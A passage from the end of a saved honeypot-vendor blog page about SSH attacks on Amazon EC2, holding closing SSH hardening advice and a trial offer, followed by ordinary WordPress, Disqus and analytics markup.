+<li>Disable username and password (keyboard-based) authentication on the SSH service. If not possible setup a Two-Factor authentication (more <a href="http://www.howtogeek.com/121650/how-to-secure-ssh-with-google-authenticators-two-factor-authentication">here</a>); and</li>
+<li>Run the SSH service on a non-default port (security by obscurity!).</li>
+</ol>
+<hr />
+<p>Malicious scripts and binary files, password lists etc. are available for download to the research community. <a title="Smart Honeypot Contact" href="http://smarthoneypot.com/#contact">Get in touch</a> if you interested to a receive a copy.</p>
+<hr />
+<p><strong>How much do you know about attackers, targeting your systems? Is your defence strategy and security controls robust enough? For 30 days let us show you who targets your systems and what their purposes are.</strong></p>
+<p style="text-align: center;"><a class="fasc-button fasc-size-large fasc-type-flat fasc-rounded-medium ico-fa fasc-ico-before fa-check-square-o" style="background-color: #dd7522; color: #ffffff;" href="https://www.smarthoneypot.com/#plans" data-fasc-style="background-color:#dd7522;color:#ffffff;">Get your Smart Honeypot trial access</a></p>
+<hr />
+<p style="text-align: center;"><em>Discuss this at <a href="http://www.reddit.com/r/netsec/comments/2f1jr6/an_indepth_analysis_of_ssh_attacks_on_amazon_ec2/">reddit</a>.</em></p>
+					</div><!-- .entry-content -->
+
+		<footer class="entry-meta">
+
+	    		      <!-- tags -->
+	      <div class="tagcloud">
+
+	          <a href="tag/aws/index.html">aws</a> <a href="tag/ec2/index.html">ec2</a> <a href="tag/honeypot/index.html">honeypot</a> 
+	      </div>
+	      <!-- end tags -->
+	      
+		</footer><!-- .entry-meta -->
+	</div>
+
+			<div class="post-inner-content secondary-content-box">
+      <!-- author bio -->
+      <div class="author-bio content-box-inner">
+
+        <!-- avatar -->
+        <div class="avatar">
+                    </div>
+        <!-- end avatar -->
+
+        <!-- user bio -->
+        <div class="author-bio-content">
+
+          <h4 class="author-name"><a href="author/smarthoneypot/index.html">Smart Honeypot</a></h4>
+          <p class="author-description">
+              A honeypot intelligence system that is simple to deploy and easy to manage. It is armed with undisclosed tactics to lure attackers revealing their activities.          </p>
+
+        </div><!-- end .author-bio-content -->
+
+      </div><!-- end .author-bio  -->
+
+		</div>
+		
+</article><!-- #post-## -->
+
+				
+	<!-- Here we load disqus comments -->
+	<div class="dcl-disqus-thread" id="comments" >
+	<div id="disqus_thread">
+				
+	
+			</div>
+	</div>
+	
+		
+			<script type="text/javascript">
+	/* <![CDATA[ */
+		var disqus_url = 'https://blog.smarthoneypot.com/in-depth-analysis-of-ssh-attacks-on-amazon-ec2/';
+		var disqus_identifier = '35 http://blog.smarthoneypot.com/?p=35';
+		var disqus_container_id = 'disqus_thread';
+		var disqus_domain = 'disqus.com';
+		var disqus_shortname = 'secdim';
+		var disqus_title = "An in-depth analysis of SSH attacks on Amazon EC2";
+		var disqus_config = function () {
+			var config = this; // Access to the config object
+			config.language = '';
+
+			/* Add the ability to add javascript callbacks */
+			
+			/*
+			   All currently supported events:
+				* preData — fires just before we request for initial data
+				* preInit - fires after we get initial data but before we load any dependencies
+				* onInit  - fires when all dependencies are resolved but before dtpl template is rendered
+				* afterRender - fires when template is rendered but before we show it
+				* onReady - everything is done
+			 */
+
+			config.callbacks.preData.push(function() {
+				// clear out the container (its filled for SEO/legacy purposes)
+				document.getElementById(disqus_container_id).innerHTML = '';
+			});
+						config.callbacks.onReady.push(function() {
+				// sync comments in the background so we don't block the page
+				var script = document.createElement('script');
+				script.async = true;
+				script.src = '?cf_action=sync_comments&post_id=35';
+
+				var firstScript = document.getElementsByTagName( "script" )[0];
+				firstScript.parentNode.insertBefore(script, firstScript);
+			});
+								};
+	/* ]]> */
+	</script>
+	
+		
+	<script type="text/javascript">
+	/* <![CDATA[ */
+		var DsqLocal = {
+			'trackbacks': [
+				],
+			'trackback_url': "https:\/\/blog.smarthoneypot.com\/in-depth-analysis-of-ssh-attacks-on-amazon-ec2\/trackback\/"		};
+	/* ]]> */
+	</script>
+			
+				<nav class="navigation post-navigation" role="navigation">
+		<h1 class="screen-reader-text">Post navigation</h1>
+		<div class="nav-links">
+			<div class="nav-previous"><a href="index.html%3Fp=8.html" rel="prev"><i class="fa fa-chevron-left"></i> Your EC2 intance can mine a bitcoin. Well, not for you!</a></div><div class="nav-next"><a href="index.html%3Fp=87.html" rel="next">Your Amazon EC2 attack profile changes on different geographic region <i class="fa fa-chevron-right"></i></a></div>		</div><!-- .nav-links -->
+	</nav><!-- .navigation -->
+	
+		
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+</div>
+	<div id="secondary" class="widget-area col-sm-12 col-md-4" role="complementary">
+		<div class="well">
+						<aside id="text-3" class="widget widget_text"><h3 class="widget-title">Smart Honeypot</h3>			<div class="textwidget"><p style="color: #000;">A custom honeypot intelligence system that is simple to deploy and easy to manage.</p>
+
+<p style="text-align: center;"><a class="fasc-button fasc-size-medium fasc-type-flat" style="background-color: #0f1e31; color: #ffffff;" href="https://www.smarthoneypot.com" data-fasc-style="background-color:#0f1e31;color:#ffffff;"> GET Your Invitation </a></p></div>
+		</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
+					<li>
+				<a href="index.html%3Fp=274.html">#HITB2015AMS Presentation: Uncovering Secret Connections among Attackers</a>
+						</li>
+					<li>
+				<a href="index.html%3Fp=271.html">#HITB2015, Amsterdam, 28th May, Uncovering Secret Connections Using Network Theory and Custom Honeypots. Looking forward to see you at our talk!</a>
+						</li>
+					<li>
+				<a href="index.html%3Fp=267.html">Come and join our presentation, So you think all those attacks are originated from China? Let&#8217;s go through a journey of an in-depth investigation of attacks by using custom honeypots. 2nd May, 14:03pm #WAHCKon [2], Perth</a>
+						</li>
+					<li>
+				<a href="index.html%3Fp=258.html">What active defence is and is not</a>
+						</li>
+					<li>
+				<a href="index.html%3Fp=243.html">5 effective use-cases of a honeypot system for enterprises</a>
+						</li>
+				</ul>
+		</aside>				</div>
+	</div><!-- #secondary -->
+		</div><!-- close .row -->
+	</div><!-- close .container -->
+</div><!-- close .site-content -->
+
+	<div id="footer-area">
+		<div class="container footer-inner">
+			<div class="row">
+				
+	
+	<div class="footer-widget-area">
+				<div class="col-sm-4 footer-widget" role="complementary">
+			<div id="sparkling_popular_posts-2" class="widget sparkling-popular-posts"><h3 class="widgettitle">Popular Posts</h3>
+    <!-- popular posts -->
+          <div class="popular-posts-wrapper">
+
+                
+                        
+                        <!-- post -->
+                        <div class="post">
+
+                          <!-- image -->
+                          <div class="post-image ">
+
+                                <a href="index.html%3Fp=35.html"></a>
+
+                          </div> <!-- end post image -->
+
+                          <!-- content -->
+                          <div class="post-content">
+
+                              <a href="index.html%3Fp=35.html">An in-depth analysis of SSH attacks on Amazon EC2</a>
+                              <span class="date">30 Aug , 2014</span>
+
+
+                          </div><!-- end content -->
+                        </div><!-- end post -->
+
+                        
+                    
+                        
+                        <!-- post -->
+                        <div class="post">
+
+                          <!-- image -->
+                          <div class="post-image ">
+
+                                <a href="index.html%3Fp=4.html"><img width="60" height="25" src="wp-content/uploads/2014/05/AWS-Logo-black.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="AWS-Logo-black" /></a>
+
+                          </div> <!-- end post image -->
+
+                          <!-- content -->
+                          <div class="post-content">
+
+                              <a href="index.html%3Fp=4.html">Project Amazon EC2</a>
+                              <span class="date">14 May , 2014</span>
+
+
+                          </div><!-- end content -->
+                        </div><!-- end post -->
+
+                        
+                    
+          </div> <!-- end posts wrapper -->
+
+		</div>		</div><!-- .widget-area .first -->
+		
+				<div class="col-sm-4 footer-widget" role="complementary">
+			<div id="tag_cloud-2" class="widget widget_tag_cloud"><h3 class="widgettitle">Tags</h3><div class="tagcloud"><a href='tag/active-defence/index.html' class='tag-link-20 tag-link-position-1' title='1 topic' style='font-size: 8pt;'>active defence</a>
+<a href='tag/amazon/index.html' class='tag-link-7 tag-link-position-2' title='1 topic' style='font-size: 8pt;'>amazon</a>
+<a href='tag/attack-chain/index.html' class='tag-link-21 tag-link-position-3' title='1 topic' style='font-size: 8pt;'>attack chain</a>
+<a href='tag/aws/index.html' class='tag-link-5 tag-link-position-4' title='5 topics' style='font-size: 18.338461538462pt;'>aws</a>
+<a href='tag/cloud/index.html' class='tag-link-10 tag-link-position-5' title='1 topic' style='font-size: 8pt;'>cloud</a>
+<a href='tag/ec2/index.html' class='tag-link-6 tag-link-position-6' title='4 topics' style='font-size: 16.615384615385pt;'>ec2</a>
+<a href='tag/enterprise/index.html' class='tag-link-19 tag-link-position-7' title='1 topic' style='font-size: 8pt;'>enterprise</a>
+<a href='tag/google-cloud/index.html' class='tag-link-22 tag-link-position-8' title='1 topic' style='font-size: 8pt;'>google cloud</a>
+<a href='tag/honeypot/index.html' class='tag-link-4 tag-link-position-9' title='8 topics' style='font-size: 22pt;'>honeypot</a>
+<a href='tag/presentation/index.html' class='tag-link-17 tag-link-position-10' title='2 topics' style='font-size: 11.876923076923pt;'>presentation</a>
+<a href='tag/ssh/index.html' class='tag-link-11 tag-link-position-11' title='1 topic' style='font-size: 8pt;'>ssh</a>
+<a href='tag/usecases/index.html' class='tag-link-18 tag-link-position-12' title='1 topic' style='font-size: 8pt;'>usecases</a>
+<a href='tag/web/index.html' class='tag-link-12 tag-link-position-13' title='1 topic' style='font-size: 8pt;'>web</a></div>
+</div>		</div><!-- .widget-area .second -->
+		
+				<div class="col-sm-4 footer-widget" role="complementary">
+			<div id="text-2" class="widget widget_text">			<div class="textwidget"><script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-66166337-1', 'auto');
+  ga('send', 'pageview');
+
+</script></div>
+		</div>		</div><!-- .widget-area .third -->
+			</div>			</div>
+		</div>
+
+		<footer id="colophon" class="site-footer" role="contentinfo">
+			<div class="site-info container">
+				<div class="row">
+										<nav role="navigation" class="col-md-6">
+						<ul id="menu-global-1" class="nav footer-nav clearfix"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-160"><a title="Smart Honeypot" href="https://www.smarthoneypot.com">Home</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-289"><a href="https://www.smarthoneypot.com/#intro">How it works?</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-288"><a href="https://www.smarthoneypot.com/#features">Features</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-290"><a href="https://www.smarthoneypot.com/#plans">Get an invitation</a></li>
+</ul>					</nav>
+					<div class="copyright col-md-6">
+						The names and logos for Smart Honeypot are registered trademarks of Security Dimension Pty Ltd (ABN 82 605 590 154). Copyright © 2015. All Rights Reserved.					</div>
+				</div>
+			</div><!-- .site-info -->
+			<div class="scroll-to-top"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+		</footer><!-- #colophon -->
+	</div>
+</div><!-- #page -->
+
+  <script type="text/javascript">
+    jQuery( document ).ready( function( $ ){
+      if ( $( window ).width() >= 767 ){
+        $( '.navbar-nav > li.menu-item > a' ).click( function(){
+            if( $( this ).attr('target') !== '_blank' ){
+                window.location = $( this ).attr( 'href' );
+            }else{
+                var win = window.open($( this ).attr( 'href' ), '_blank');
+                win.focus();
+            }
+        });
+      }
+    });
+  </script>
+            <script type="text/javascript">
+            // <![CDATA[
+            var disqus_shortname = 'secdim';
+            (function () {
+                var nodes = document.getElementsByTagName('span');
+                for (var i = 0, url; i < nodes.length; i++) {
+                    if (nodes[i].className.indexOf('dsq-postid') != -1) {
+                        nodes[i].parentNode.setAttribute('data-disqus-identifier', nodes[i].getAttribute('data-dsqidentifier'));
+                        url = nodes[i].parentNode.href.split('#', 1);
+                        if (url.length == 1) { url = url[0]; }
+                        else { url = url[1]; }
+                        nodes[i].parentNode.href = url + '#disqus_thread';
+                    }
+                }
+                var s = document.createElement('script'); 
+                s.async = true;
+                s.type = 'text/javascript';
+                s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+                (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+            }());
+            // ]]>
+            </script>
+            <script type='text/javascript' src='wp-content/themes/sparkling/inc/js/skip-link-focus-fix.js%3Fver=20140222'></script>
+<script type='text/javascript' src='wp-includes/js/comment-reply.min.js%3Fver=4.5.15'></script>
+<script type='text/javascript' src='wp-includes/js/wp-embed.min.js%3Fver=4.5.15'></script>
+<script  type="text/javascript">
+
+    var disqus_shortname = "secdim";
+    if (typeof ds_loaded == "undefined") {
+        var ds_loaded = false;
+    }
+    var disqus_config = function () {
+        this.page.url = "https://blog.smarthoneypot.com/in-depth-analysis-of-ssh-attacks-on-amazon-ec2/";
+        this.page.identifier = "35";
+        this.page.title = "An in-depth analysis of SSH attacks on Amazon EC2";
+    };
+    function loadDisqus() {
+        var disqus_div = document.getElementById("disqus_thread");
+        var top = disqus_div.offsetTop;
+        var disqus_data = disqus_div.dataset;
+        if ( !ds_loaded && ( window.scrollY || window.pageYOffset ) + window.innerHeight > top ) {
+            ds_loaded = true;
+            for (var key in disqus_data) {
+                if (key.substr(0,6) == "disqus") {
+                    window["disqus_" + key.replace("disqus","").toLowerCase()] = disqus_data[key];
+								}
+                }
+                var dsq = document.createElement("script");
+                dsq.type = "text/javascript";
+                dsq.async = true;
+                dsq.src = "https://" + window.disqus_shortname + ".disqus.com/embed.js";
+                if(document.getElementById("dcl-hidden-div")) {
+                    document.getElementById("dcl-hidden-div").innerHTML = "Loading...";
+                }
+                (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(dsq);
+            }
+        }
+					var disqus_div_new = document.getElementById("disqus_thread");
+		var divExists = disqus_div_new != null;
+                if(document.body.scrollHeight < window.innerHeight){
+                    loadDisqus();
+                } else if(divExists) {
+                    window.onscroll = function() { loadDisqus(); }
+                }
+	</script><script   type='text/javascript'>
+                /* <![CDATA[ */
+                var hash = window.location.hash;
+                var disqus_shortname = 'secdim';
+                if(hash!==''){
+                    var ds_loaded = true;
+                    var dcl_loaded = 1;
+                    (function() {
+                        var dsq = document.createElement('script'); dsq.type = 'text/javascript';
+                        dsq.async = true;
+                        dsq.src = '//' + disqus_shortname + '.' + 'disqus.com' + '/' + 'embed' + '.js' + '?pname=wordpress&pver=2.84';
+                        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                    })();}
+                /* ]]> */
+            </script>
+</body>
+</html>
